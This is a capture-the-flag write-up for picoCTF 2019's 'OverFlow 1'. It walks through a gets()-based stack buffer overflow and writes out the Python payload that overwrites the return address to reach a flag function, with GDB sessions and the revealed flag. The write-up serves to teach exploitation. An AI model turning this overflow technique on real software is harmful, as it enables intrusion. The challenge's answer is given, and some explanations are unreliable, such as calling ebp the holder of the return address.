# PicoCTF19 OverFlow 1

## Challenge

You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this [program](https://2019shell1.picoctf.com/static/8b7521756bddb2cce5c14fd2b60cd354/vuln)? You can find it in /problems/overflow-1 on the shell server. [Source](https://2019shell1.picoctf.com/static/8b7521756bddb2cce5c14fd2b60cd354/vuln.c).

## Hints

Take control that return address

Make sure your address is in Little Endian.

## Solution

Let's view that directory:

```bash
samson@pico-2019-shell1:/problems/overflow-1$ ls -al
total 92
drwxr-xr-x   2 root       root          4096 Sep 28 21:51 .
drwxr-x--x 684 root       root         69632 Oct 10 18:02 ..
-r--r-----   1 hacksports overflow-1_3    42 Sep 28 21:51 flag.txt
-rwxr-sr-x   1 hacksports overflow-1_3  7532 Sep 28 21:51 vuln
-rw-rw-r--   1 hacksports hacksports     742 Sep 28 21:51 vuln.c
```

Let's view `vuln.c`

```
samson@pico-2019-shell1:/problems/overflow-1$ cat vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```

As expected, there is a function that prints the flag but it's never explicitly called.

The program takes a string and attempts to jump to that address. But hey, since this is an overflow question let's just give the program a bunch of garbage and see what happens.

```bash
samson@pico-2019-shell1:/problems/overflow-1$ ./vuln
Give me a string and lets see what happens: 

Woah, were jumping to 0x8048705 !
samson@pico-2019-shell1:/problems/overflow-1$ ./vuln
Give me a string and lets see what happens: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Woah, were jumping to 0x41414141 !
Segmentation fault (core dumped)
```

Hmm: `0x41414141`. If you're familiar with the [ASCII Table](https://en.wikipedia.org/wiki/ASCII), `A` is `41` in hexadecimal.

So it looks like we overwrite some instructions with our input. Let's find the minimal amount of `A`'s required to change the jump address.

```bash
samson@pico-2019-shell1:/problems/overflow-1$ echo $(python -c "print 'A'*77") | ./vuln
Give me a string and lets see what happens:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Woah, were jumping to 0x8040041 !
Segmentation fault (core dumped)
```

Notice how with no input the value is `0x8048705` but with 77 `A`'s, it's `0x8040041`.

You can see the first `41` is at the end. This is due to `x86_64` working in little endian mode.

So basically this overflow seems like we might have to overwrite the address with the address of the flag and in order to do that we first need to figure out which memory address the flag function is located at and we can do that with GDB.

```bash
samson@pico-2019-shell1:/problems/overflow-1$ gdb ./vuln 
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
... <redacted>
Reading symbols from ./vuln...(no debugging symbols found)...done.
(gdb) x flag
0x80485e6 <flag>:       0x53e58955
(gdb) q
```

There it is at memory address `0x80485e6`.

Let's try working that into the address:

```bash
samson@pico-2019-shell1:/problems/overflow-1$ echo $(python -c "print 'A'*77+'\xe6'")  | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x800e641 !
Segmentation fault (core dumped)
samson@pico-2019-shell1:/problems/overflow-1$ echo $(python -c "print 'A'*76+'\xe6'") | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80400e6 !
Segmentation fault (core dumped)
samson@pico-2019-shell1:/problems/overflow-1$ echo $(python -c "print 'A'*76+'\xe6\x85\x04\x08'") | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb}Segmentation fault (core dumped)
```
## More detailed explanation

So why did that work? We won't have a nice function that tells us the return address all the time.

In x86 assembly, the memory address of where a program is returning to is held in the `ebp` register, otherwise known as the base pointer. So let's try to see if we can match the register value to what the function prints out for us

```bash
samson@pico-2019-shell1:/problems/overflow-1$ ./vuln 
Give me a string and lets see what happens: 
picoCTF
Woah, were jumping to 0x8048705 !
samson@pico-2019-shell1:/problems/overflow-1$ gdb ./vuln
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
... <redacted>

(gdb) r < <(python -c 'print("A"*64)')
Starting program: /problems/overflow-1/vuln < <(python -c 'print("A"*64)')
Give me a string and lets see what happens: 
Woah, were jumping to 0x8048705 !
[Inferior 1 (process 2891586) exited normally]

(gdb) r < <(python -c 'print("A"*76+"\xe6\x85\x04\x08")')
Starting program: /problems/overflow-1/vuln < <(python -c 'print("A"*76+"\xe6\x85\x04\x08")')
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
Flag File is Missing. please contact an Admin if you are running this on the shell server.
[Inferior 1 (process 2891439) exited normally]
```

Just verifying we can send in input through GDB.

```bash
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x0804865f <+0>:     push   %ebp
   0x08048660 <+1>:     mov    %esp,%ebp
   0x08048662 <+3>:     push   %ebx
   0x08048663 <+4>:     sub    $0x44,%esp
   0x08048666 <+7>:     call   0x8048520 <__x86.get_pc_thunk.bx>
   0x0804866b <+12>:    add    $0x1995,%ebx
   0x08048671 <+18>:    sub    $0xc,%esp
   0x08048674 <+21>:    lea    -0x48(%ebp),%eax
   0x08048677 <+24>:    push   %eax
   0x08048678 <+25>:    call   0x8048430 <gets@plt>
   0x0804867d <+30>:    add    $0x10,%esp
   0x08048680 <+33>:    call   0x8048714 <get_return_address>
   0x08048685 <+38>:    sub    $0x8,%esp
   0x08048688 <+41>:    push   %eax
   0x08048689 <+42>:    lea    -0x17f9(%ebx),%eax
   0x0804868f <+48>:    push   %eax
   0x08048690 <+49>:    call   0x8048420 <printf@plt>
   0x08048695 <+54>:    add    $0x10,%esp
   0x08048698 <+57>:    nop
   0x08048699 <+58>:    mov    -0x4(%ebp),%ebx
   0x0804869c <+61>:    leave  
   0x0804869d <+62>:    ret    
End of assembler dump.
```

We know the `call   0x8048430 <gets@plt>` is where the assembly code gets user input so lets view the important bits of the stack change as we step through it after setting a breakpoint right before it.

How do we know `gets()` is the function that's vulnerable? Well try running `man gets`. Here's an excerpt:

```
GETS(3)    Linux Programmer's Manual    GETS(3)

NAME
  gets - get a string from standard input (DEPRECATED)

SYNOPSIS
  #include <stdio.h>

  char *gets(char *s);

DESCRIPTION
  Never use this function.
  gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which replaces with a null byte ('\0'). No check for buffer overrun is performed (see BUGS below).

RETURN VALUE
  gets() returns s on success, and NULL on error or when end of file occurs while no characters have been read. However, given the lack of buffer overrun checking, there can be no guarantees that the function will even return.
```

```bash
(gdb) b* 0x08048678
Breakpoint 1 at 0x8048678
(gdb) r < <(python -c 'print("A"*76+"\xe6\x85\x04\x08")')
Starting program: /problems/overflow-1/vuln < <(python -c 'print("A"*76+"\xe6\x85\x04\x08")')
Give me a string and lets see what happens: 

Breakpoint 1, 0x08048678 in vuln ()
(gdb) info frame
Stack level 0, frame at 0xffde0df0:
 eip = 0x8048678 in vuln; saved eip = 0x8048705
 called by frame at 0xffde0e20
 Arglist at 0xffde0de8, args: 
 Locals at 0xffde0de8, Previous frame's sp is 0xffde0df0
 Saved registers:
  ebx at 0xffde0de4, ebp at 0xffde0de8, eip at 0xffde0dec
```

Note the output: `saved eip = 0x8048705`. As we know the EIP is the instruction pointer that the allows to the CPU to remember where to jump to after returning from a function.

Let's step through with the `next instruction` command and watch what happens after the program receives our input.

```bash
(gdb) ni
0x0804867d in vuln ()
(gdb) i f
Stack level 0, frame at 0xffde0df0:
 eip = 0x804867d in vuln; saved eip = 0x80485e6
 called by frame at 0x41414149
 Arglist at 0xffde0de8, args: 
 Locals at 0xffde0de8, Previous frame's sp is 0xffde0df0
 Saved registers:
  ebx at 0xffde0de4, ebp at 0xffde0de8, eip at 0xffde0dec
```

There we go. We overwrote the old value of the eip and now the program should technically jump wherever we want, in our case the address of the flag.

## Flag

`picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb}`